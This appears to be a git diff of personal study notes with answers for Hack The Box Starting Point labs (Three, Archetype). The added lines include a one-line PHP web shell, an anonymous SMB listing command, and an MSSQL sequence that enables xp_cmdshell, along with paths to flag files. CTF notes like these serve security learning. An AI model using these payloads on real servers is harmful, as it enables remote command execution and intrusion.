@@ -173,6 +173,36 @@
 2. thetoppers.htb
 3. /etxc/hosts
 4. s3.thetoppers.htb
-5. 
+5. AMAZON S3 
+6. awscli
+7. aws configure
+8. aws s3 ls
+9. php
+    ```
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+    ```
+10. cat /var/www/flag.txt
 
 # Tier2
+## Arcetype
+1. 1433
+2. ```smbclient -M -L IP```
+3. ```smbclient -N \\\\10.129.84.75\\backups```
+4. mssqlclient.py 
+5. xp_cmdshell
+6. winPeas
+要設定才能執行xp_cmdshell
+payload:
+```
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+7. ConsoleHost_history.txt
+8. C:\Users\sql_svc\Desktop\user.txt
+9. C:\Users\Administrator\Desktop\root.txt
+
+## Oopsie
+1. 
